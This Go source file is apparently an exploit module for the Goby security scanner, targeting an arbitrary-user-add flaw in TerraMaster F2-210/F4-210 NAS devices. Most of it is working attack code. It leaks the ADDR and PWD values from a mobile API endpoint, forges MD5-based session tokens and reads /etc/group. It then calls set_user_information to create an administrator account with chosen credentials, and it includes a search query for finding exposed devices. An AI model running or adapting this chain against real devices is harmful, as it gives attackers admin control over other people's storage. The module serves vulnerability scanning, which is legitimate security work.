package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Terramaster F4-210 wapNasIPS components Arbitrary User Add Vulnerability",
    "Description": "<p>TerraMaster F2-210 and F4-210 are NAS (Network Attached Storage) devices of Terramaster, Shenzhen, China.</p><p>TerraMaster F2-210 and F4-210 have arbitrary user addition vulnerabilities. Attackers can add an administrator account and obtain server permissions by leaking sensitive information and forging sessions.</p>",
    "Impact": "<p>Terramaster F4-210 Arbitrary User Add</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.terra-master.com/cn/\">https://www.terra-master.com/cn/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "TerraMaster F4-210",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "Terramaster 存储设备 F4-210 wapNasIPS 组件任意用户添加漏洞",
            "Product": "TerraMaster F4-210",
            "Description": "<p>TerraMaster F2-210和F4-210是中国深圳市图美电子技术（Terramaster）公司的NAS（网络附属存储）设备。</p><p>TerraMaster F2-210和F4-210存在任意用户添加漏洞，攻击者可通过敏感信息泄露伪造session来添加管理员账号，获取服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.terra-master.com/cn/\">https://www.terra-master.com/cn/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>TerraMaster F2-210和F4-210存在任意用户添加漏洞，攻击者可通过敏感信息泄露伪造session来添加管理员账号，获取服务器权限。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Terramaster F4-210 wapNasIPS components Arbitrary User Add Vulnerability",
            "Product": "TerraMaster F4-210",
            "Description": "<p>TerraMaster F2-210 and F4-210 are NAS (Network Attached Storage) devices of Terramaster, Shenzhen, China.</p><p>TerraMaster F2-210 and F4-210 have arbitrary user addition vulnerabilities. Attackers can add an administrator account and obtain server permissions by leaking sensitive information and forging sessions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.terra-master.com/cn/\">https://www.terra-master.com/cn/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Terramaster F4-210 Arbitrary User Add</p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "title=\"TOS Loading\"",
    "GobyQuery": "title=\"TOS Loading\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.terra-master.com/cn/",
    "DisclosureDate": "2022-01-04",
    "References": [
        "https://packetstormsecurity.com/files/165399/terramaster-exec.py.txt"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "6.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "username",
            "type": "input",
            "value": "test01",
            "show": ""
        },
        {
            "name": "password",
            "type": "input",
            "value": "test01",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10250"
}`

	tos_encrypt_str := func(key, toencrypt string) string {
		Str1 := key + toencrypt
		return fmt.Sprintf("%x", md5.Sum([]byte(Str1)))
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/module/api.php?mobile/wapNasIPS"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("user-agent", "TNAS")
			cfg1.Header.Store("user-device", "TNAS")
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "PWD") && strings.Contains(resp.RawBody, "ADDR") {
					KeyFind := regexp.MustCompile("\"ADDR\":\"(.*?)\",").FindStringSubmatch(resp.RawBody)
					Key1 := KeyFind[1][6:]
					PWDFind := regexp.MustCompile("\"PWD\":\"(.*?)\",").FindStringSubmatch(resp.RawBody)
					timestamp1 := fmt.Sprintf("%v", time.Now().Unix())
					signature1 := tos_encrypt_str(Key1, timestamp1)
					kod_token1 := tos_encrypt_str(Key1, "")
					kod_token2 := tos_encrypt_str(Key1, PWDFind[1])
					uri2 := "/module/api.php?mobile/fileDownload"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("user-agent", "TNAS")
					cfg2.Header.Store("user-device", "TNAS")
					cfg2.Header.Store("signature", signature1)
					cfg2.Header.Store("timestamp", timestamp1)
					cfg2.Header.Store("authorization", PWDFind[1])
					cfg2.Header.Store("Cookie", "kod_name=guest; kod_token="+kod_token1)
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg2.Data = `path=%2Fetc%2Fgroup`
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil && resp2.StatusCode == 200 {
						UsersFind := regexp.MustCompile("admin:x:3:(.*?)\n").FindStringSubmatch(resp2.RawBody)
						fmt.Println(UsersFind[1])
						Userlist := strings.Split(UsersFind[1], ",")
						fmt.Println(Userlist)
						for _, i2 := range Userlist {
							uri3 := "/module/api.php?mobile/__construct"
							cfg3 := httpclient.NewPostRequestConfig(uri3)
							cfg3.VerifyTls = false
							cfg3.FollowRedirect = false
							cfg3.Header.Store("user-agent", "TNAS")
							cfg3.Header.Store("user-device", "TNAS")
							cfg3.Header.Store("signature", signature1)
							cfg3.Header.Store("timestamp", timestamp1)
							cfg3.Header.Store("authorization", PWDFind[1])
							cfg3.Header.Store("Cookie", "kod_name="+i2+"; kod_token="+kod_token2)
							if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil && resp3.StatusCode == 200 {
								PHPSESSIDFind := regexp.MustCompile("Set-Cookie: PHPSESSID=(.*?);").FindStringSubmatch(resp3.HeaderString.String())
								uri4 := "/module/api.php?mobile/set_user_information"
								cfg4 := httpclient.NewPostRequestConfig(uri4)
								cfg4.VerifyTls = false
								cfg4.FollowRedirect = false
								cfg4.Header.Store("user-agent", "TNAS")
								cfg4.Header.Store("user-device", "TNAS")
								cfg4.Header.Store("signature", signature1)
								cfg4.Header.Store("timestamp", timestamp1)
								cfg4.Header.Store("authorization", PWDFind[1])
								cfg4.Header.Store("Cookie", "kod_name="+i2+"; kod_token="+kod_token2+";PHPSESSID="+PHPSESSIDFind[1])
								cfg4.Header.Store("Content-Type", "application/x-www-form-urlencoded")
								cfg4.Data = `groups=%5B%22allusers%22%2C+%22admin%22%5D&username=admin&operation=0&password=admin&capacity=`
								if resp4, err := httpclient.DoHttpRequest(u, cfg4); err == nil {
									if resp4.StatusCode == 200 && strings.Contains(resp4.RawBody, "user exist") {
										return true
									}
								}
							}
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			user := ss.Params["username"].(string)
			pass := ss.Params["password"].(string)
			uri1 := "/module/api.php?mobile/wapNasIPS"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("user-agent", "TNAS")
			cfg1.Header.Store("user-device", "TNAS")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "PWD") && strings.Contains(resp.RawBody, "ADDR") {
					KeyFind := regexp.MustCompile("\"ADDR\":\"(.*?)\",").FindStringSubmatch(resp.RawBody)
					Key1 := KeyFind[1][6:]
					PWDFind := regexp.MustCompile("\"PWD\":\"(.*?)\",").FindStringSubmatch(resp.RawBody)
					timestamp1 := fmt.Sprintf("%v", time.Now().Unix())
					signature1 := tos_encrypt_str(Key1, timestamp1)
					kod_token1 := tos_encrypt_str(Key1, "")
					kod_token2 := tos_encrypt_str(Key1, PWDFind[1])
					uri2 := "/module/api.php?mobile/fileDownload"
					cfg2 := httpclient.NewPostRequestConfig(uri2)
					cfg2.VerifyTls = false
					cfg2.FollowRedirect = false
					cfg2.Header.Store("user-agent", "TNAS")
					cfg2.Header.Store("user-device", "TNAS")
					cfg2.Header.Store("signature", signature1)
					cfg2.Header.Store("timestamp", timestamp1)
					cfg2.Header.Store("authorization", PWDFind[1])
					cfg2.Header.Store("Cookie", "kod_name=guest; kod_token="+kod_token1)
					cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
					cfg2.Data = `path=%2Fetc%2Fgroup`
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
						UsersFind := regexp.MustCompile("admin:x:3:(.*?)\n").FindStringSubmatch(resp2.RawBody)
						fmt.Println(UsersFind[1])
						Userlist := strings.Split(UsersFind[1], ",")
						fmt.Println(Userlist)
						for _, i2 := range Userlist {
							uri3 := "/module/api.php?mobile/__construct"
							cfg3 := httpclient.NewPostRequestConfig(uri3)
							cfg3.VerifyTls = false
							cfg3.FollowRedirect = false
							cfg3.Header.Store("user-agent", "TNAS")
							cfg3.Header.Store("user-device", "TNAS")
							cfg3.Header.Store("signature", signature1)
							cfg3.Header.Store("timestamp", timestamp1)
							cfg3.Header.Store("authorization", PWDFind[1])
							cfg3.Header.Store("Cookie", "kod_name="+i2+"; kod_token="+kod_token2)
							if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil && resp3.StatusCode == 200 {
								PHPSESSIDFind := regexp.MustCompile("Set-Cookie: PHPSESSID=(.*?);").FindStringSubmatch(resp3.HeaderString.String())
								uri4 := "/module/api.php?mobile/set_user_information"
								cfg4 := httpclient.NewPostRequestConfig(uri4)
								cfg4.VerifyTls = false
								cfg4.FollowRedirect = false
								cfg4.Header.Store("user-agent", "TNAS")
								cfg4.Header.Store("user-device", "TNAS")
								cfg4.Header.Store("signature", signature1)
								cfg4.Header.Store("timestamp", timestamp1)
								cfg4.Header.Store("authorization", PWDFind[1])
								cfg4.Header.Store("Cookie", "kod_name="+i2+"; kod_token="+kod_token2+";PHPSESSID="+PHPSESSIDFind[1])
								cfg4.Header.Store("Content-Type", "application/x-www-form-urlencoded")
								cfg4.Data = fmt.Sprintf(`groups=%%5B%%22allusers%%22%%2C+%%22admin%%22%%5D&username=%s&operation=0&password=%s&capacity=`, user, pass)
								if resp4, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg4); err == nil && resp4.StatusCode == 200 && (strings.Contains(resp4.RawBody, "user exist") || strings.Contains(resp4.RawBody, "create user successful")) {
									expResult.Output = resp4.RawBody
									expResult.Success = true
									break
								}
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
